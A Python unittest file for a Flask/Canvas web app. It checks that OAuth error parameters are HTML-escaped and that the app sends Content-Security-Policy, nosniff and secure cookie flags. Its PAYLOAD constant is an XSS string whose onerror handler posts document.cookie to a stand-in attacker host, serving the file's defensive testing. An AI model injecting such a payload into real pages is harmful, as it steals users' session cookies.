"""The OAuth callback echoes its `error`/`error_description` query parameters back to the browser, so
a link to /authorized/?error=<script>... would run script on this app's origin if they were not
escaped. These tests make sure they stay escaped, and that the Content-Security-Policy and cookie
flags that limit what an injected script could do stay in place."""

import importlib
import os
import re
import sys
import unittest
from unittest import mock

from flask import Flask

from application import TEMPLATES_DIR
from config import load_config
from tests.unit.support import AppTestCase

PAYLOAD = '<img src=x onerror="fetch(\'https://evil.example\', {method: \'POST\', body: document.cookie})">'
ESCAPED_PAYLOAD = ("&lt;img src=x onerror=&#34;fetch(&#39;https://evil.example&#39;, "
                   "{method: &#39;POST&#39;, body: document.cookie})&#34;&gt;")
ENV = {"CANVAS_SERVER_URL": "https://canvas.test/", "CANVAS_CLIENT_ID": "id",
       "CANVAS_CLIENT_SECRET": "secret", "SECRET_KEY": "test", "DATABASE_URL": "sqlite:///:memory:"}


class SecurityHeaderTests(AppTestCase):
    def test_oauth_error_is_escaped(self):
        for query_string in [
            {"error": "access_denied", "error_description": PAYLOAD},
            {"error": PAYLOAD},  # with no description the error itself is shown
        ]:
            with self.subTest(query_string=query_string):
                response = self.client.get("/authorized/", query_string=query_string)
                self.assertEqual(response.status_code, 403)
                page = response.get_data(as_text=True)
                self.assertEqual(page, "Access denied: " + ESCAPED_PAYLOAD)
                self.assertNotIn("<img", page)

    def test_every_response_has_a_content_security_policy(self):
        for path in ["/", "/offerings/", "/offerings/101/api/state", "/authorized/?error=access_denied",
                     "/assets/css/style.css", "/missing"]:
            # Closing the response closes the stylesheet's file.
            with self.subTest(path=path), self.client.get(path) as response:
                policy = dict(directive.split(" ", 1)
                              for directive in response.headers["Content-Security-Policy"].split("; "))
                # an injected script cannot fetch() or load an image from another site to hand it data
                self.assertEqual(policy["connect-src"], "'self'")
                self.assertEqual(policy["img-src"], "'self' data:")
                # ...and nothing inline or from elsewhere runs as script
                self.assertEqual(policy["script-src"], "'self'")
                # browsers apply form-action to the redirects after a post too, and a post made once
                # the Canvas token has expired is redirected to Canvas to log in again
                self.assertNotIn("form-action", policy)
                self.assertEqual(response.headers["X-Content-Type-Options"], "nosniff")

    def test_templates_have_no_inline_script(self):
        # script-src has no 'unsafe-inline', so the browser would ignore these; put the script in
        # assets/js instead (as with assets/js/confirm.js for data-confirm= forms).
        for name in os.listdir(TEMPLATES_DIR):
            with self.subTest(template=name), open(os.path.join(TEMPLATES_DIR, name)) as f:
                html = f.read()
                self.assertEqual(re.findall(r"<[^>]*\son[a-z]+\s*=", html), [])
                self.assertEqual(re.findall(r"<script(?![^>]*\ssrc=)[^>]*>", html), [])
                self.assertNotIn("javascript:", html)

    def test_the_app_sends_the_security_headers(self):
        with mock.patch.dict(os.environ, {**ENV, "FLASK_ENV": "development"}):
            sys.modules.pop("main", None)
            main = importlib.import_module("main")
        response = main.app.test_client().get("/health")
        self.assertIn("Content-Security-Policy", response.headers)
        self.assertEqual(response.headers["X-Content-Type-Options"], "nosniff")


class SessionCookieTests(unittest.TestCase):
    def test_deployed_session_and_remember_cookies_are_http_only_lax_and_secure(self):
        for env in ["staging", "production"]:
            with self.subTest(env=env), mock.patch.dict(os.environ, {**ENV, "FLASK_ENV": env}):
                app = Flask(__name__)
                load_config(app)
                self.assertIs(app.config["SESSION_COOKIE_HTTPONLY"], True)
                self.assertEqual(app.config["SESSION_COOKIE_SAMESITE"], "Lax")
                self.assertIs(app.config["SESSION_COOKIE_SECURE"], True)
                # Flask-Login's remember cookie is HttpOnly by default
                self.assertIs(app.config.get("REMEMBER_COOKIE_HTTPONLY", True), True)
                self.assertEqual(app.config["REMEMBER_COOKIE_SAMESITE"], "Lax")
                self.assertIs(app.config["REMEMBER_COOKIE_SECURE"], True)
